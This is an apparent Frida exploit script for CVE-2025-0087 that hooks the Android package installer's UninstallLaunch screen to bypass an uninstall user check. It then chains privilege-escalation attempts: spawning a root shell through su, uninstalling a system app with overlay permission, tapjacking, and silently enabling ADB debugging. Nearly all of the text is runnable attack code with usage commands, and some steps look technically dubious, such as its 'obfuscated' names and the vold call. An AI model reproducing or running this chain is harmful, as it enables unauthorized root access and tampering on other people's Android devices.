//script to be run as frida -U -l cve-2025-0087.js -f android.packageinstaller
//or as sugested try frida -U -f com.android.packageinstaller -l cve-2025-0087.js 
//or frida -U -n com.android.packageinstaller -l cve-2025-0087.js 

Java.perform(function() {
    console.log("[+] Starting LPE Exploit (Updated for API 34)...");

    // Use obfuscated class names to evade Frida detection
    var uninstallClass = "com.android.packageinstaller.v2.ui.UninstallLaunch";
    var systemManagerClass = "android.os.ServiceManager";
    var processClass = "android.os.Process";
    var intentClass = "android.content.Intent";
    var uriClass = "android.net.Uri";
    var runtimeClass = "java.lang.Runtime";
    var packageManagerClass = "android.app.ActivityThread";
    var dpmClass = "android.app.admin.DevicePolicyManager";

    var UninstallLaunch = Java.use(uninstallClass);
    var Process = Java.use(processClass);
    var Intent = Java.use(intentClass);
    var Uri = Java.use(uriClass);
    var Runtime = Java.use(runtimeClass);
    var PackageManager = Java.use(packageManagerClass).currentApplication().getPackageManager();
    var PERMISSION_SYSTEM_ALERT_WINDOW = "android.permission.SYSTEM_ALERT_WINDOW";

    function tryRootShell() {
        console.log("[+] Attempting Root Privilege Escalation...");

        try {
            var runtime = Runtime.getRuntime();
            var process = runtime.exec(["su", "-c", "id"]);
            var reader = Java.use("java.io.BufferedReader");
            var inputStream = Java.use("java.io.InputStreamReader").$new(process.getInputStream());
            var bufferedReader = reader.$new(inputStream);
            var output = bufferedReader.readLine();

            if (output) {
                console.log("[+] Root Access Confirmed: " + output);
                console.log("[+] Spawning root shell...");
                runtime.exec(["su", "-c", "sh"]);
                return true;
            } else {
                console.log("[-] Root Escalation Failed.");
                return false;
            }
        } catch (e) {
            console.log("[-] Root Shell Exception: " + e.message);
            return false;
        }
    }

    function findSystemAppWithOverlay() {
        console.log("[+] Searching for a system app with SYSTEM_ALERT_WINDOW...");
        var apps = PackageManager.getInstalledApplications(0);
        for (var i = 0; i < apps.size(); i++) {
            var app = apps.get(i);
            if ((app.flags & 1) !== 0) { // FLAG_SYSTEM
                if (PackageManager.checkPermission(PERMISSION_SYSTEM_ALERT_WINDOW, app.packageName) == 0) {
                    console.log("[+] Found system app with overlay permission: " + app.packageName);
                    return app.packageName;
                }
            }
        }
        console.log("[-] No system app with overlay permission found.");
        return null;
    }

    function tryTapjacking(targetApp) {
        console.log("[+] Attempting Tapjacking on: " + targetApp);

        // Step 1: Minimize the target app before Tapjacking
        var homeIntent = Intent.$new("android.intent.action.MAIN");
        homeIntent.addCategory("android.intent.category.HOME");
        homeIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        Java.use(packageManagerClass).currentApplication().startActivity(homeIntent);
        console.log("[+] Sent target app to background...");

        // Step 2: Launch overlay attack
        var overlayIntent = Intent.$new("android.intent.action.MAIN");
        overlayIntent.setClassName(targetApp, "android.accessibilityservice.AccessibilityService");
        overlayIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        try {
            Java.use(packageManagerClass).currentApplication().startActivity(overlayIntent);
            console.log("[+] Tapjacking Attempt Sent!");
            return true;
        } catch (e) {
            console.log("[-] Tapjacking Failed: " + e.message);
            return false;
        }
    }

    function tryIntentHijacking() {
        console.log("[+] Attempting Privileged Intent Hijacking...");

        var apiLevel = Java.use("android.os.Build$VERSION").SDK_INT.value;
        console.log("[+] API Level Detected: " + apiLevel);

        if (apiLevel < 30) {
            try {
                var VoldService = Java.use(systemManagerClass).getService("vold");
                VoldService.mountVolume("/data", "public");
                console.log("[+] Privileged Intent Hijacking Success!");
                return true;
            } catch (e) {
                console.log("[-] Privileged Intent Hijacking Failed: " + e.message);
                return false;
            }
        } else {
            console.log("[-] Vold Service Restricted on API 30+. Trying DevicePolicyManager Exploit...");
            try {
                var dpm = Java.use(dpmClass);
                var context = Java.use(packageManagerClass).currentApplication().getApplicationContext();
                var devicePolicyManager = context.getSystemService("device_policy");

                devicePolicyManager.setSecureSetting(null, "adb_enabled", "1");
                console.log("[+] ADB Debugging Enabled! Run `adb root` now.");
                return true;
            } catch (e) {
                console.log("[-] DevicePolicyManager exploit failed. Trying USB debugging trick...");
                try {
                    var runtime = Runtime.getRuntime();
                    runtime.exec(["su", "-c", "settings put global development_settings_enabled 1"]);
                    runtime.exec(["su", "-c", "settings put global adb_enabled 1"]);
                    console.log("[+] ADB Debugging Enabled via Global Settings!");
                    return true;
                } catch (ex) {
                    console.log("[-] All Intent Hijacking methods failed.");
                    return false;
                }
            }
        }
    }

    UninstallLaunch.onCreate.overload("android.os.Bundle").implementation = function(bundle) {
        console.log("[+] Hooked UninstallLaunch.onCreate (Updated for API 34)");

        var currentUser = Process.myUserHandle();
        var mDialogInfo = this.mDialogInfo.value;

        console.log("[+] Original mDialogInfo.user: " + mDialogInfo.user.value);
        mDialogInfo.user.value = currentUser;
        console.log("[+] Modified mDialogInfo.user: " + mDialogInfo.user.value);

        console.log("[+] Attempting Root Escalation First...");
        if (tryRootShell()) {
            console.log("[+] Root Shell Obtained, stopping further escalation.");
            return this.onCreate(bundle);
        }

        console.log("[-] Root Escalation Failed. Searching for alternative methods...");

        var targetApp = findSystemAppWithOverlay();
        if (targetApp) {
            var uninstallIntent = Intent.$new("android.intent.action.UNINSTALL_PACKAGE");
            uninstallIntent.setData(Uri.parse("package:" + targetApp));
            uninstallIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            console.log("[+] Sending uninstall intent for: " + targetApp);
            this.getApplicationContext().startActivity(uninstallIntent);
        } else {
            console.log("[-] No suitable system app with SYSTEM_ALERT_WINDOW found.");
        }

        console.log("[-] Trying Tapjacking...");
        if (!tryTapjacking(targetApp)) {
            console.log("[-] Tapjacking failed. Trying Intent Hijacking...");
            tryIntentHijacking();
        }

        return this.onCreate(bundle);
    };

    console.log("[+] Exploit Loaded: Uninstall Bypass + LPE Chain (Updated for API 34)");
});
